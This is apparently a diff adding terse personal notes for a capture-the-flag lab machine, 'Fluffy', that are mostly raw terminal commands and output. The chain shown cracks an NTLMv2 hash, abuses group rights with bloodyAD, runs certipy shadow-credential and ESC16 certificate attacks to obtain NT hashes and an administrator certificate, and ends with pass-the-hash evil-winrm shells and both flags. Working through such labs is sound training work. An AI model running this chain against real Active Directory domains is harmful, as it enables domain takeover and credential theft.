@@ -102,4 +102,332 @@ smb: \>
 [SMB] NTLMv2-SSP Username : FLUFFY\p.agila
 [SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:a425ef66d40dc1cf:F03FA30F96A0D8BA2E6D0C424F04EB6D:01010000000000008056797E150CDC0142A4EB5BD0E56A8C0000000002000800570045005400350001001E00570049004E002D00520030003200560048004C004A005A00560054004A0004003400570049004E002D00520030003200560048004C004A005A00560054004A002E0057004500540035002E004C004F00430041004C000300140057004500540035002E004C004F00430041004C000500140057004500540035002E004C004F00430041004C00070008008056797E150CDC0106000400020000000800300030000000000000000100000000200000CEE5B0CB1875C5A883253B94A543A012F29099F86AB4671AA3BE08BAD3504A2C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310036000000000000000000
 
+└─$ john hash --wordlist=/home/ed/tools/rockyou.txt --format=netntlmv2
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+prometheusx-303  (p.agila)     
+1g 0:00:00:01 DONE (2025-08-15 17:44) 0.5347g/s 2415Kp/s 2415Kc/s 2415KC/s proquis..prom pics
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+
+//get credntial pair  -u 'p.agila' -p 'prometheusx-303' 
+//from bloodhound, p is member of SERVICE ACCOUNT manager, has Gwrite privi to 'service accounts',  which has Gwrite to ca_svc, ldap_svc winrm_svc
+
+└─$ bloodyAD --host '10.10.11.69' -d 'dc.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila
+[+] p.agila added to SERVICE ACCOUNTS
+
+└─$ bloodyAD --host '10.10.11.69' -d 'dc.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' set password 'LDAP_SVC' 'Password123!'
+Traceback (most recent call last):
+  File "/usr/bin/bloodyAD", line 8, in <module>
+    sys.exit(main())
+             ~~~~^^
+  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
+    output = args.func(conn, **params)
+  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 241, in password
+    raise e
+  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 86, in password
+    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
+    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
+    raise err
+msldap.commons.exceptions.LDAPModifyException: Password can't be changed. It may be because the oldpass provided is not valid.
+You can try to use another password change protocol such as smbpasswd, server error may be more explicit.
+
+//cannot reset password of these accounts.
+
+
+
+└─$  certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '28c3285e-7465-f1b6-22c4-648d109b6850'
+[*] Adding Key Credential with device ID '28c3285e-7465-f1b6-22c4-648d109b6850' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID '28c3285e-7465-f1b6-22c4-648d109b6850' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Using principal: winrm_svc@fluffy.htb
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': None
+
+//to sync the time to target machine
+
+└─$ sudo nano  /etc/systemd/timesyncd.conf   
+[sudo] password for ed: 
+                                                                                                        
+┌──(ed㉿kali)-[~]
+└─$ sudo systemctl restart systemd-timesyncd.service 
+
+
+
+└─$ sudo ntpdate fluffy.htb                         
+2025-08-19 19:52:27.875343 (+1000) +25230.292833 +/- 0.112998 fluffy.htb 10.10.11.69 s1 no-leap
+CLOCK: time stepped by 25230.292833
+                                                                                                        
+┌──(ed㉿kali)-[~]
+└─$ date
+Tue Aug 19 19:52:35 AEST 2025
+                                                                                                        
+┌──(ed㉿kali)-[~]
+└─$ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'c8c5e9f8-1c9a-6933-67d0-d423d6a66631'
+[*] Adding Key Credential with device ID 'c8c5e9f8-1c9a-6933-67d0-d423d6a66631' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID 'c8c5e9f8-1c9a-6933-67d0-d423d6a66631' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Using principal: winrm_svc@fluffy.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
+                                                                                                        
+┌──(ed㉿kali)-[~]
+└─$ evil-winrm -i puppy.htb -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+                                        
+Error: Exiting with code 1
+                                                                                                        
+┌──(ed㉿kali)-[~]
+└─$ evil-winrm -i fluffy.htb -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> dir
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ..
+*Evil-WinRM* PS C:\Users\winrm_svc> cd desktop
+*Evil-WinRM* PS C:\Users\winrm_svc\desktop> dir
+
+
+    Directory: C:\Users\winrm_svc\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        8/18/2025   6:03 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc\desktop> type user.txt
+ea046b4d8f14e9c4dbd33bb35bc0e1e7
+
+┌──(ed㉿kali)-[~]
+└─$ bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
+[+] p.agila added to SERVICE ACCOUNTS
+                                                                                                        
+┌──(ed㉿kali)-[~]
+└─$ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'ca_svc'  -dc-ip '10.10.11.69'                    
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'bde9f22c-7905-e73c-6b2c-ff2effadc771'
+[*] Adding Key Credential with device ID 'bde9f22c-7905-e73c-6b2c-ff2effadc771' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID 'bde9f22c-7905-e73c-6b2c-ff2effadc771' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Using principal: ca_svc@fluffy.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+
+└─$ certipy-ad find -vulnerable -u CA_SVC -hashes ":ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.10.11.69
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
+[*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'fluffy-DC01-CA'
+[*] Saved BloodHound data to '20250819200805_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20250819200805_Certipy.txt'
+[*] Saved JSON output to '20250819200805_Certipy.json'
+                                                                                                        
+┌──(ed㉿kali)-[~]
+└─$ cat 20250819200805_Certipy.txt 
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+Certificate Templates                   : [!] Could not find any certificate templates
+
+//update the version of certipy-ad
+
+└─$ cat 20250819201045_Certipy.txt 
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+Certificate Templates                   : [!] Could not find any certificate templates
+                                                                                         
+
+                                                                                        
+
+
+
+                                                                                                        
+┌──(ed㉿kali)-[~]
+└─$ bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
+[+] p.agila added to SERVICE ACCOUNTS
+                                                                                                        
+┌──(ed㉿kali)-[~]
+└─$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target 'fluffy.htb' -upn 'administrator' -user 'CA_SVC' update 
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
+[!] Use -debug to print a stacktrace
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+                                                                                                        
+
+
+└─$ certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[*] Requesting certificate via RPC
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+
+┌──(ed㉿kali)-[~/oscptest/fluffy.htb]
+└─$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
+                                                                                                        
+┌──(ed㉿kali)-[~/oscptest/fluffy.htb]
+└─$ ls    
+20250815174826_bloodhound.zip  administrator.pfx  ca_svc.ccache  hash
+
+┌──(ed㉿kali)-[~/oscptest/fluffy.htb]
+└─$ certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+
+└─$ evil-winrm -i fluffy.htb -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd desktop
+*Evil-WinRM* PS C:\Users\Administrator\desktop> dir
+type
+
+    Directory: C:\Users\Administrator\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        8/18/2025   6:03 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
+a593db07f1988da7860a13b1b4d00f2d
+*Evil-WinRM* PS C:\Users\Administrator\desktop> 
 
